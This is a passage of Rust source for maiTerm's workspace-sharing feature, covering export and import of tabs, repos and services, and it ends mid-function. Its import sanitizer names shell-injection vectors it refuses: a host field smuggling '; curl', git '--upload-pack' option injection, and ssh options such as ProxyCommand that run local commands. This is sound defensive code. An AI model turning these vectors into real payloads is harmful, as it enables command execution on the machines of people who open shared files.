//! Workspace Share (docs/workspace-share.md): a workspace exported so ANOTHER user, on
//! another computer, can bootstrap it — the same tabs in the same repos, cloning what they
//! don't have yet. Backup restores your own machine; this carries structure, never identity.
//!
//! Export builds the file from an allowlist (§1): everything is constructed field by field
//! into `Shared*` types, so a new `Tab` field can never leak into a share by default. That is
//! the opposite of the rule for reload (`carry_tab_state_on_reload`), and deliberately so.

pub mod commands;
pub mod git;
pub mod open;

use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::state::workspace::{EditorFileInfo, SplitNode, TabType, WorkspaceNote};
use crate::state::{AgentRuntime, Pane, Service, Tab, Task, Workspace, Workstream};

pub const FORMAT: &str = "maiterm-workspace";
pub const VERSION: u32 = 1;
pub const EXTENSION: &str = "maiterm-workspace";

// ── The file (§6) ────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShareFile {
    pub format: String,
    pub version: u32,
    pub exported_at: String,
    pub maiterm_version: String,
    pub workspace: SharedWorkspace,
    pub roots: Vec<SharedRoot>,
    #[serde(default)]
    pub services: Vec<SharedService>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub notes: Option<SharedNotes>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tasks: Option<SharedTasks>,
    /// What `parse` took out of the file as unsafe to run (§4.2), for the wizard to show. Never
    /// read from a file: a sender can't pre-fill it, and an export leaves it empty.
    #[serde(skip_deserializing, default, skip_serializing_if = "Vec::is_empty")]
    pub refused: Vec<String>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RootKind {
    Git,
    Plain,
}

/// One directory the receiver maps (§2). Every tab, editor file and service cwd points into
/// one of these by `root_id` + `subpath`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedRoot {
    pub id: String,
    /// Home-relative when under the sender's home (`~/src/app`), absolute otherwise.
    pub path: String,
    pub kind: RootKind,
    /// name → URL. Empty for a plain root.
    #[serde(default)]
    pub remotes: BTreeMap<String, String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub branch: Option<String>,
}

impl SharedRoot {
    /// The remote a clone uses and names its directory after: `origin`, else the first.
    pub fn clone_url(&self) -> Option<&String> {
        self.remotes.get("origin").or_else(|| self.remotes.values().next())
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Loc {
    pub root_id: String,
    /// Relative to the root, `/`-separated; "" is the root itself.
    #[serde(default)]
    pub subpath: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedWorkspace {
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub split_root: Option<SplitNode>,
    pub panes: Vec<SharedPane>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub active_pane_id: Option<String>,
    /// A Mesh Workspace (`bridge_all`, docs/mesh-workspace.md): every agent tab bridged to
    /// every other. Membership IS the roster, so the flag plus each tab's role (its name and
    /// `mesh_purpose`) is the whole mesh. Topics are not: they are conversation history
    /// between the SENDER's sessions, keyed by their tab ids.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub mesh: bool,
}

/// Ids inside the file are file-local references (split leaves, task assignees). Every one
/// of them is re-minted on import.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedPane {
    pub id: String,
    pub name: String,
    pub tabs: Vec<SharedTab>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub active_tab_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedTab {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub custom_name: bool,
    pub kind: SharedTabKind,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auto_resume: Option<SharedAutoResume>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent: Option<SharedAgent>,
    /// Mesh role: what this agent owns, fed into its priming.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mesh_purpose: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum SharedTabKind {
    /// None = the sender's cwd was unknown; the tab opens at home.
    Local { location: Option<Loc> },
    Remote { ssh_command: String, remote_cwd: Option<String> },
    Editor { location: Loc, language: Option<String> },
    RemoteEditor { ssh_command: String, remote_path: String, file_path: String, language: Option<String> },
}

/// The sender's auto-resume settings. Where it resumes is derived from the tab's own kind on
/// import, so a remapped root moves it too.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedAutoResume {
    pub enabled: bool,
    #[serde(default)]
    pub pinned: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub remembered_command: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedAgent {
    pub runtime: AgentRuntime,
    /// Remote tabs only (§5): the session the receiver forks. A local transcript is on the
    /// sender's disk, so a local id would name nothing the receiver can reach.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedService {
    pub name: String,
    pub command: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub location: Option<Loc>,
    #[serde(default)]
    pub env: Vec<SharedEnv>,
    #[serde(default)]
    pub auto_start: bool,
    pub restart: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ready_pattern: Option<String>,
}

/// A variable's name always travels; its value only if the sender ticked it (§3).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedEnv {
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub value: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SharedNotes {
    /// file tab id → note
    #[serde(default)]
    pub tabs: BTreeMap<String, SharedNote>,
    #[serde(default)]
    pub workspace: Vec<SharedNote>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SharedNote {
    pub content: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mode: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SharedTasks {
    #[serde(default)]
    pub workstreams: Vec<Workstream>,
    #[serde(default)]
    pub tasks: Vec<Task>,
}

// ── Reading and writing ──────────────────────────────────────────────────────────────────

pub fn write_file(file: &ShareFile, path: &Path) -> Result<(), String> {
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use std::io::Write;
    let json = serde_json::to_string_pretty(file).map_err(|e| e.to_string())?;
    let out = std::fs::File::create(path).map_err(|e| format!("Couldn't create {}: {e}", path.display()))?;
    let mut enc = GzEncoder::new(out, Compression::default());
    enc.write_all(json.as_bytes()).map_err(|e| format!("Couldn't write the file: {e}"))?;
    enc.finish().map_err(|e| format!("Couldn't finish the file: {e}"))?;
    Ok(())
}

/// Read a share file — gzip'd or plain JSON, sniffed by content rather than trusted to the
/// extension. A newer version is refused whole, never partially imported (§6).
/// The file and a digest of its bytes. The wizard reviews one read and builds from another; the
/// digest is how the build knows it's the file the human approved (§4.2).
pub fn read_file(path: &Path) -> Result<(ShareFile, String), String> {
    use sha2::Digest;
    use std::io::Read;
    let bytes = std::fs::read(path).map_err(|e| format!("Couldn't read {}: {e}", path.display()))?;
    let digest = sha2::Sha256::digest(&bytes).iter().map(|b| format!("{b:02x}")).collect();
    let text = if bytes.starts_with(&[0x1f, 0x8b]) {
        let mut s = String::new();
        flate2::read::GzDecoder::new(&bytes[..])
            .read_to_string(&mut s)
            .map_err(|e| format!("Couldn't decompress the file: {e}"))?;
        s
    } else {
        String::from_utf8(bytes).map_err(|_| "This isn't a maiTerm workspace file".to_string())?
    };
    Ok((parse(&text)?, digest))
}

pub fn parse(text: &str) -> Result<ShareFile, String> {
    let value: serde_json::Value =
        serde_json::from_str(text).map_err(|_| "This isn't a maiTerm workspace file".to_string())?;
    if value.get("format").and_then(|f| f.as_str()) != Some(FORMAT) {
        return Err("This isn't a maiTerm workspace file".to_string());
    }
    let version = value.get("version").and_then(|v| v.as_u64()).unwrap_or(0);
    if version > VERSION as u64 {
        return Err(format!(
            "This workspace was shared from a newer maiTerm (format v{version}). Update maiTerm to import it."
        ));
    }
    let mut file: ShareFile =
        serde_json::from_value(value).map_err(|e| format!("The workspace file is damaged: {e}"))?;
    sanitize(&mut file);
    Ok(file)
}

// ── What a file may make this computer run (§4.2) ────────────────────────────────────────────
//
// A shared file comes from someone else, and opens on a double-click. The commands in it that are
// commands by nature (auto-resume, services) are shown to the human and run only if approved.
// What's here is the rest: fields that are NOT meant to be commands but are pasted into one — an
// ssh target and a remote directory typed into the local shell, a session id typed after
// `claude --resume`, a URL handed to git. Those are refused outright, not reviewed, because the
// review shows them as a host or an id and a reader can't be expected to spot `nova; curl …`
// in a host field.

/// Characters that are plain in a shell word. Anything else in an ssh target or remote
/// directory ends the word, starts an expansion or quotes — so the value isn't what it looks like.
fn shell_plain(c: char) -> bool {
    c.is_alphanumeric() || "@._:/=,+%~-".contains(c)
}

/// Why this ssh command can't be typed into the receiver's shell, if it can't. Besides shell
/// syntax, a few ssh options run a LOCAL command with no shell characters at all
/// (`-oProxyCommand=…`), or pull one in from a file (`-F`).
pub fn ssh_refusal(cmd: &str) -> Option<String> {
    if cmd.trim().is_empty() {
        return Some("it's empty".to_string());
    }
    if let Some(c) = cmd.chars().find(|&c| c != ' ' && !shell_plain(c)) {
        return Some(format!("it contains {c:?}, which the shell would act on"));
    }
    // Options that run, or load code from, something on this computer.
    // `smartcarddevice` is ssh's alias for PKCS11Provider; `xauthlocation` is run with -X/-Y.
    const RUNS_LOCALLY: [&str; 10] = [
        "proxycommand", "localcommand", "permitlocalcommand", "knownhostscommand",
        "match", "include", "pkcs11provider", "securitykeyprovider", "smartcarddevice", "xauthlocation",
    ];
    // ssh(1)'s flags that take an argument. A cluster (`-vp22`, `-lFred`) is read the way ssh
    // reads it: flags until the first of these, whose argument is the rest of the token or,
    // if nothing is left, the next token — so `Fred` in `-lFred` is a user, not `-F`.
    const TAKES_ARG: &str = "BbcDEeFIiJLlmOoPpQRSWw";
    let tokens: Vec<&str> = cmd.split(' ').filter(|t| !t.is_empty()).collect();
    let mut i = 0;
    while i < tokens.len() {
        let t = tokens[i];
        i += 1;
        let Some(cluster) = t.strip_prefix('-').filter(|c| !c.is_empty() && !c.starts_with('-')) else { continue };
        for (at, flag) in cluster.char_indices() {
            if !TAKES_ARG.contains(flag) {
                continue;
            }
            let rest = &cluster[at + flag.len_utf8()..];
            let arg = if rest.is_empty() {
                i += 1;
                tokens.get(i - 1).copied().unwrap_or("")
            } else {
                rest
            };
            match flag {
                'F' | 'E' => return Some(format!("its -{flag} flag reads or writes a file on this computer")),
                'I' => return Some("its -I flag loads a library on this computer".to_string()),
                'o' => {
                    // ssh skips an empty first word, so `-o=ProxyCommand=x` names ProxyCommand.
                    let name = arg.split('=').find(|p| !p.is_empty()).unwrap_or("").to_ascii_lowercase();
                    if let Some(k) = RUNS_LOCALLY.iter().find(|k| name == **k) {
                        return Some(format!("its {k} option runs a command on this computer"));
                    }
                }
                _ => {}
            }
            break;
        }
    }
    None
}

/// A remote directory goes inside the single-quoted remote command maiTerm types locally
/// (`buildSshCommand`), where a quote, space or `;` in it lands in the LOCAL shell.
fn remote_dir_refusal(dir: &str) -> Option<String> {
    dir.chars().find(|&c| !shell_plain(c)).map(|c| format!("it contains {c:?}"))
}

/// Session ids are typed after `claude --resume`/`codex fork`: uuids, nothing else.
fn session_id_ok(id: &str) -> bool {
    !id.is_empty() && id.len() <= 128 && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
}

/// A URL or branch starting with `-` is an option to git (`--upload-pack=<cmd>`).
fn git_arg_ok(s: &str) -> bool {
    !s.starts_with('-') && !s.chars().any(char::is_control)
}

fn sanitize(file: &mut ShareFile) {
    let mut refused = Vec::new();
    for root in &mut file.roots {
        let before = root.remotes.len();
        root.remotes.retain(|_, url| git_arg_ok(url));
        if root.remotes.len() < before {
            refused.push(format!("{}: a repository address that git would read as an option", root.path));
        }
        if root.branch.as_deref().is_some_and(|b| !git_arg_ok(b)) {
            refused.push(format!("{}: a branch name that git would read as an option", root.path));
            root.branch = None;
        }
        if root.kind == RootKind::Git && root.remotes.is_empty() {
            root.kind = RootKind::Plain;
        }
    }
    for s in &mut file.services {
        // The name goes unquoted into `env NAME=… command` (stack/model.ts `startLine`).
        let name_ok = |n: &str| {
            n.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
                && n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        };
        let service = s.name.clone();
        s.env.retain(|e| {
            let ok = name_ok(&e.name);
            if !ok {
                refused.push(format!("Service “{service}”: {:?} isn't a variable name, so it was dropped", e.name));
            }
            ok
        });
    }
    // Names reach agents' prompts too: a mesh member's role is its tab name, pasted into its own
    // opener and every peer's. Same rule as the mesh role below.
    let clean = |s: &mut String, cap: usize| {
        let c: String = s.chars().filter(|c| !c.is_control()).take(cap).collect();
        let changed = c != *s;
        *s = c;
        changed
    };
    if clean(&mut file.workspace.name, 200) {
        refused.push("Control characters were removed from the workspace name".to_string());
    }
    let mut seen_ids = std::collections::HashSet::new();
    for pane in &mut file.workspace.panes {
        clean(&mut pane.name, 200);
        pane.tabs.retain_mut(|tab| {
            if clean(&mut tab.name, 200) {
                refused.push(format!("Tab “{}”: control characters were removed from its name", tab.name));
            }
            let bad_ssh = match &tab.kind {
                SharedTabKind::Remote { ssh_command, remote_cwd } => ssh_refusal(ssh_command)
                    .map(|why| format!("its ssh command ({ssh_command}): {why}"))
                    .or_else(|| {
                        remote_cwd.as_deref().and_then(|d| remote_dir_refusal(d).map(|why| format!("its remote directory ({d}): {why}")))
                    }),
                // The path is expanded on the remote with an unquoted `echo` (`expand_remote_tilde`).
                SharedTabKind::RemoteEditor { ssh_command, remote_path, .. } => ssh_refusal(ssh_command)
                    .map(|why| format!("its ssh command ({ssh_command}): {why}"))
                    .or_else(|| remote_dir_refusal(remote_path).map(|why| format!("its remote file ({remote_path}): {why}"))),
                _ => None,
            };
            if let Some(why) = bad_ssh {
                refused.push(format!("Tab “{}” was left out — {why}", tab.name));
                return false;
            }
            // Review keys are tab ids: two tabs sharing one would share one approval.
            if !seen_ids.insert(tab.id.clone()) {
                refused.push(format!("Tab “{}” was left out — another tab in the file has its id", tab.name));
                return false;
            }
            // A mesh role is pasted into the agent's prompt. Control characters could end the
            // paste early and turn the rest into keystrokes; the text itself is shown in review.
            if let Some(p) = &mut tab.mesh_purpose {
                let clean: String = p.chars().filter(|c| !c.is_control()).take(500).collect();
                if clean != *p {
                    refused.push(format!("Tab “{}”: control characters were removed from its mesh role", tab.name));
                    *p = clean;
                }
            }
            if let Some(agent) = &mut tab.agent {
                if agent.session_id.as_deref().is_some_and(|id| !session_id_ok(id)) {
                    refused.push(format!("Tab “{}”: its session id isn't one, so its agent starts fresh", tab.name));
                    agent.session_id = None;
                }
            }
            true
        });
    }
    file.refused = refused;
}

// ── Paths ────────────────────────────────────────────────────────────────────────────────

/// `canonicalize`, minus Windows' verbatim prefix. On Windows it returns `\\?\C:\Users\bob`,
/// which then lands in a typed `git clone` destination and every spawn cwd — and cmd.exe
/// refuses a `\\?\` current directory outright. A UNC share (`\\?\UNC\…`) keeps it: there the
/// prefix is load-bearing. Falls back to the input when the path doesn't exist.
pub fn canon(p: &Path) -> PathBuf {
    let c = std::fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf());
    strip_verbatim(c)
}

fn strip_verbatim(p: PathBuf) -> PathBuf {
    let s = p.to_string_lossy();
    match s.strip_prefix(r"\\?\") {
        Some(rest) if !rest.starts_with("UNC\\") => PathBuf::from(rest),
        _ => p,
    }
}

fn home() -> Option<PathBuf> {
    Some(canon(&dirs::home_dir()?))
}

pub fn expand_tilde(path: &str) -> PathBuf {
    if path == "~" {
        return home().unwrap_or_else(|| PathBuf::from(path));
    }
    if let Some(rest) = path.strip_prefix("~/") {
        if let Some(h) = home() {
            return h.join(rest);
        }
    }
    PathBuf::from(path)
}

/// `~/…` when under home, so the same layout on the receiving machine needs no prompt (§2).
fn home_relative(path: &Path) -> String {
    if let Some(h) = home() {
        if path == h {
            return "~".to_string();
        }
        if let Ok(rest) = path.strip_prefix(&h) {
            return format!("~/{}", to_slash(rest));
        }
    }
    path.to_string_lossy().to_string()
}

fn to_slash(p: &Path) -> String {
    p.components()
        .map(|c| c.as_os_str().to_string_lossy().to_string())
        .collect::<Vec<_>>()
        .join("/")
}

/// `root` + `subpath`, the subpath's `/` separators turned into this platform's.
pub fn join_subpath(root: &Path, subpath: &str) -> PathBuf {
    let mut p = root.to_path_buf();
    for part in subpath.split('/').filter(|s| !s.is_empty() && *s != "." && *s != "..") {
        p.push(part);
    }
    p
}

// ── Export ───────────────────────────────────────────────────────────────────────────────

/// What the frontend knows about a tab that Rust can't: its live cwd / host (cleaned ssh
/// command — the raw one can carry the sender's MAITERM_AUTH), and whether an agent is
/// running in it right now.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct TabShareContext {
    pub tab_id: String,
    #[serde(default)]
    pub cwd: Option<String>,
    #[serde(default)]
    pub ssh_command: Option<String>,
    #[serde(default)]
    pub remote_cwd: Option<String>,
    #[serde(default)]
    pub live_agent: Option<LiveAgent>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LiveAgent {
    pub runtime: AgentRuntime,
    #[serde(default)]
    pub session_id: Option<String>,
}

/// The binary a runtime's command line starts with.
fn runtime_binary(rt: AgentRuntime) -> &'static str {
    match rt {
        AgentRuntime::Claude => "claude",
        AgentRuntime::Codex => "codex",
        AgentRuntime::Gemini => "gemini",
    }
}

fn session_var(rt: AgentRuntime) -> &'static str {
    crate::state::agent_runtime::descriptor(rt).session_id_var
}

/// An ssh command still carrying maiTerm's injected remote command would put the sender's
/// tab id and MCP auth token in the file. The frontend cleans it; this refuses anything that
/// slipped through rather than trusting that it always will.
fn safe_ssh(cmd: Option<&str>) -> Option<String> {
    let cmd = cmd?.trim();
    if cmd.is_empty() {
        return None;
    }
    if cmd.contains("MAITERM_") {
        log::warn!("share: dropping an ssh command that still carries maiTerm's injected env");
        return None;
    }
    Some(cmd.to_string())
}

/// Roots discovered so far, deduplicated by canonical directory.
#[derive(Default)]
struct RootTable {
    roots: Vec<SharedRoot>,
    by_dir: HashMap<PathBuf, String>,
    /// root id → why the receiver might not get the sender's code
    warnings: HashMap<String, String>,
}

impl RootTable {
    /// Where `dir` lives, as root + subpath. Git: the repo top level. Anything else: the
    /// directory itself, as a plain root.
    fn locate_dir(&mut self, dir: &Path) -> Loc {
        let canon = canon(dir);
        let top = if canon.is_dir() { git::toplevel(&canon) } else { None };
        let (root_dir, kind) = match &top {
            Some(t) => (t.clone(), RootKind::Git),
            None => (canon.clone(), RootKind::Plain),
        };
        let root_id = match self.by_dir.get(&root_dir) {
            Some(id) => id.clone(),
            None => {
                let id = format!("r{}", self.roots.len() + 1);
                let (remotes, branch) = if kind == RootKind::Git {
                    (git::remotes(&root_dir), git::branch(&root_dir))
                } else {
                    (BTreeMap::new(), None)
                };
                // A repo nobody can clone is, to the receiver, just a directory to pick.
                let kind = if kind == RootKind::Git && remotes.is_empty() { RootKind::Plain } else { kind };
                if kind == RootKind::Git {
                    if let Some(w) = git::push_warning(&root_dir, branch.as_deref()) {
                        self.warnings.insert(id.clone(), w);
                    }
                } else {
                    self.warnings.insert(
                        id.clone(),
                        "not a git repository with a remote — the receiver has to supply this directory".to_string(),
                    );
                }
                self.roots.push(SharedRoot {
                    id: id.clone(),
                    path: home_relative(&root_dir),
                    kind,
                    remotes: if kind == RootKind::Git { remotes } else { BTreeMap::new() },
                    branch: if kind == RootKind::Git { branch } else { None },
                });
                self.by_dir.insert(root_dir.clone(), id.clone());
                id
            }
        };
        let subpath = canon.strip_prefix(&root_dir).map(to_slash).unwrap_or_default();
        Loc { root_id, subpath }
    }

    fn locate_file(&mut self, file: &Path) -> Loc {
        let canon = canon(file);
        let parent = canon.parent().map(Path::to_path_buf).unwrap_or_else(|| canon.clone());
        let mut loc = self.locate_dir(&parent);
        let name = canon.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();
        loc.subpath = if loc.subpath.is_empty() { name } else { format!("{}/{}", loc.subpath, name) };
        loc
    }
}

/// Why a tab is treated as an agent tab (§5), or None. `runtime`/session ids are sticky, so a
/// tab that merely once ran an agent is not one: it needs a live agent now, or auto-resume
/// that launches its runtime.
fn detect_agent(tab: &Tab, ctx: Option<&TabShareContext>) -> Option<(AgentRuntime, &'static str)> {
    if let Some(live) = ctx.and_then(|c| c.live_agent.as_ref()) {
        return Some((live.runtime, "running now"));
    }
    let rt = tab.runtime?;
    let cmd = tab.auto_resume_command.as_deref()?;
    if tab.auto_resume_enabled && command_runtime(cmd) == Some(rt) {
        return Some((rt, "auto-resume starts it"));
    }
    None
}

/// Which agent a command line starts, reading past the ways people wrap one: `env` and
/// `VAR=value` prefixes, a full path to the binary, and `npx`/`bunx`/`pnpx` of the package.
/// A first-word test missed every hand-edited form, and each miss put an agent command in a
/// tab exported as a plain shell.
fn command_runtime(cmd: &str) -> Option<AgentRuntime> {
    let mut words = cmd.split_whitespace().peekable();
    while let Some(w) = words.peek() {
        let is_assignment = w.split_once('=').is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'));
        if *w == "env" || w.starts_with('-') && *w != "-" || is_assignment {
            words.next();
        } else {
            break;
        }
    }
    let mut word = words.next()?;
    if matches!(word.rsplit(['/', '\\']).next(), Some("npx" | "bunx" | "pnpx")) {
        // Skip the runner's own flags (`npx -y @anthropic-ai/claude-code`).
        word = words.find(|w| !w.starts_with('-'))?;
        return if word.contains("claude-code") {
            Some(AgentRuntime::Claude)
        } else if word.contains("codex") {
            Some(AgentRuntime::Codex)
        } else if word.contains("gemini-cli") {
            Some(AgentRuntime::Gemini)
        } else {
            None
        };
    }
    let base = word.rsplit(['/', '\\']).next().unwrap_or(word);
    let base = base.strip_suffix(".exe").unwrap_or(base);
    [AgentRuntime::Claude, AgentRuntime::Codex, AgentRuntime::Gemini]
        .into_iter()
        .find(|rt| runtime_binary(*rt) == base)
}

/// Where a terminal tab is, from the frontend's live context, then the persisted chains §2
/// names. Returns (ssh_command, remote_cwd, local_cwd).
fn tab_place(tab: &Tab, ctx: Option<&TabShareContext>) -> (Option<String>, Option<String>, Option<String>) {
    let ssh = safe_ssh(
        ctx.and_then(|c| c.ssh_command.as_deref())
            .or(tab.auto_resume_ssh_command.as_deref())
            .or(tab.restore_ssh_command.as_deref()),
    );
    if ssh.is_some() {
        // NOT `last_cwd`: it is written from `osc.cwd ?? promptCwd`, and on a remote with no
        // OSC 7 `osc.cwd` is still the LOCAL shell's — a sender path that makes the receiver's
        // `cd … && exec $SHELL` fail and ssh exit. No remote cwd lands in the login directory,
        // which is at least a working shell. The frontend's context applies the same
        // stale-OSC-7 test the duplicate paths do.
        let remote = ctx
            .and_then(|c| c.remote_cwd.clone())
            .or_else(|| tab.auto_resume_remote_cwd.clone())
            .or_else(|| tab.restore_remote_cwd.clone());
        return (ssh, remote, None);
    }
    let local = ctx
        .and_then(|c| c.cwd.clone())
        .or_else(|| tab.auto_resume_cwd.clone())
        .or_else(|| tab.restore_cwd.clone())
        .or_else(|| tab.last_cwd.clone());
    (None, None, local)
}

/// A tab left out of the share, and why — shown in the export dialog.
fn dropped_reason(tab: &Tab) -> Option<&'static str> {
    if tab.service_id.is_some() {
        return Some("a stack service's console — the service itself is shared below");
    }
    match tab.tab_type {
        TabType::Diff => Some("diff tabs hold file contents"),
        TabType::Board => Some("board tabs aren't shared"),
        _ => None,
    }
}

// Export preview, for the dialog.

#[derive(Debug, Clone, Serialize)]
pub struct ExportPreview {
    pub name: String,
    pub roots: Vec<RootPreview>,
    pub tabs: Vec<TabPreview>,
    pub services: Vec<ServicePreview>,
    pub note_count: usize,
    pub task_count: usize,
}

#[derive(Debug, Clone, Serialize)]
pub struct RootPreview {
    #[serde(flatten)]
    pub root: SharedRoot,
    pub warning: Option<String>,
    pub tab_count: usize,
}

#[derive(Debug, Clone, Serialize)]
pub struct TabPreview {
    pub id: String,
    pub name: String,
    /// "local" | "remote" | "editor" | "remote_editor" | "dropped"
    pub kind: &'static str,
    pub root_id: Option<String>,
    pub place: Option<String>,
    pub agent: Option<AgentPreview>,
    pub dropped_reason: Option<&'static str>,
}

#[derive(Debug, Clone, Serialize)]
pub struct AgentPreview {
    pub runtime: AgentRuntime,
    pub reason: &'static str,
    /// A remote tab whose session can be forked — false means a fresh agent on import.
    pub forkable: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct ServicePreview {
    pub id: String,
    pub name: String,
    pub env_names: Vec<String>,
}

/// The sender's choices in the export dialog.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct ExportOptions {
    #[serde(default)]
    pub include_notes: bool,
    #[serde(default)]
    pub include_tasks: bool,
    /// Services to include, by id, each with the env var names whose values travel.
    #[serde(default)]
    pub services: Vec<ServiceChoice>,
    /// Tab ids the sender left ticked as agent tabs.
    #[serde(default)]
    pub agent_tab_ids: Vec<String>,
}

#[derive(Debug, Clone, Deserialize)]
pub struct ServiceChoice {
    pub id: String,
    #[serde(default)]
    pub env_values: Vec<String>,
}

struct Built {
    file: ShareFile,
    table: RootTable,
    previews: Vec<TabPreview>,
}

/// The one export pass. The preview and the written file come out of the same walk, so what
/// the dialog showed is what was written.
fn build(ws: &Workspace, contexts: &[TabShareContext], opts: &ExportOptions, for_preview: bool) -> Built {
    let ctx_of = |id: &str| contexts.iter().find(|c| c.tab_id == id);
    let mut table = RootTable::default();
    let mut previews = Vec::new();
    let mut panes = Vec::new();

    for pane in &ws.panes {
        let mut tabs = Vec::new();
        for tab in &pane.tabs {
            let ctx = ctx_of(&tab.id);
            if let Some(reason) = dropped_reason(tab) {
                if tab.service_id.is_none() {
                    previews.push(TabPreview {
                        id: tab.id.clone(),
                        name: tab.name.clone(),
                        kind: "dropped",
                        root_id: None,
                        place: None,
                        agent: None,
                        dropped_reason: Some(reason),
                    });
                }
                continue;
            }
            let (kind, preview_kind, root_id, place) = match tab.tab_type {
                TabType::Editor => match tab.editor_file.as_ref() {
                    Some(f) if f.is_remote => {
                        let (Some(ssh), Some(rp)) = (safe_ssh(f.remote_ssh_command.as_deref()), f.remote_path.clone()) else {
                            continue;
                        };
                        let place = format!("{ssh}:{rp}");
                        (
                            SharedTabKind::RemoteEditor { ssh_command: ssh, remote_path: rp, file_path: f.file_path.clone(), language: f.language.clone() },
                            "remote_editor",
                            None,
                            Some(place),
                        )
                    }
                    Some(f) => {
                        let loc = table.locate_file(&expand_tilde(&f.file_path));
                        let id = loc.root_id.clone();
                        (SharedTabKind::Editor { location: loc, language: f.language.clone() }, "editor", Some(id), Some(f.file_path.clone()))
                    }
                    None => continue,
                },
                _ => {
                    let (ssh, remote_cwd, local) = tab_place(tab, ctx);
                    match ssh {
                        Some(ssh) => {
                            let place = match &remote_cwd {
                                Some(c) => format!("{ssh}:{c}"),
                                None => ssh.clone(),
                            };
                            (SharedTabKind::Remote { ssh_command: ssh, remote_cwd }, "remote", None, Some(place))
                        }
                        None => {
                            let loc = local.as_deref().map(|c| table.locate_dir(&expand_tilde(c)));
                            let id = loc.as_ref().map(|l| l.root_id.clone());
                            (SharedTabKind::Local { location: loc }, "local", id, local)
                        }
                    }
                }
            };

            let is_terminal = matches!(kind, SharedTabKind::Local { .. } | SharedTabKind::Remote { .. });
            let is_remote = matches!(kind, SharedTabKind::Remote { .. });
            let detected = if is_terminal { detect_agent(tab, ctx) } else { None };
            let session_of = |rt: AgentRuntime| {
                ctx.and_then(|c| c.live_agent.as_ref())
                    .and_then(|l| l.session_id.clone())
                    .or_else(|| tab.trigger_variables.get(session_var(rt)).cloned())
                    .filter(|s| !s.is_empty())
            };
            let agent = detected
                .filter(|_| for_preview || opts.agent_tab_ids.contains(&tab.id))
                .map(|(rt, _)| SharedAgent {
                    runtime: rt,
                    session_id: if is_remote { session_of(rt) } else { None },
                });

            // A tab the sender did NOT export as an agent must not start one through its
            // auto-resume command either: on the receiver `claude --resume %claudeSessionId`
            // interpolates to `claude --resume ` and opens the session picker in a tab the
            // sender marked "not an agent".
            let keep_command = |c: &Option<String>| c.clone().filter(|c| agent.is_some() || for_preview || command_runtime(c).is_none());
            let auto_resume = if is_terminal
                && (tab.auto_resume_command.is_some() || tab.auto_resume_cwd.is_some() || tab.auto_resume_ssh_command.is_some())
            {
                // A literal session id in the command names the SENDER's conversation. As the
                // runtime's variable it names whatever session the receiver's tab comes to own.
                let own_ids: Vec<String> = [AgentRuntime::Claude, AgentRuntime::Codex, AgentRuntime::Gemini]
                    .iter()
                    .filter_map(|rt| tab.trigger_variables.get(session_var(*rt)).map(|v| (*rt, v.clone())))
                    .filter(|(_, v)| v.len() >= 8)
                    .map(|(rt, v)| format!("{}\u{0}{}", session_var(rt), v))
                    .collect();
                let scrub = |c: &Option<String>| {
                    c.as_ref().map(|c| {
                        own_ids.iter().fold(c.clone(), |acc, pair| {
                            let (var, id) = pair.split_once('\u{0}').unwrap();
                            acc.replace(id, &format!("%{var}"))
                        })
                    })
                };
                Some(SharedAutoResume {
                    enabled: tab.auto_resume_enabled,
                    pinned: tab.auto_resume_pinned,
                    command: keep_command(&scrub(&tab.auto_resume_command)),
                    remembered_command: keep_command(&scrub(&tab.auto_resume_remembered_command)),
                })
            } else {
                None
            };

            previews.push(TabPreview {
                id: tab.id.clone(),
                name: tab.name.clone(),
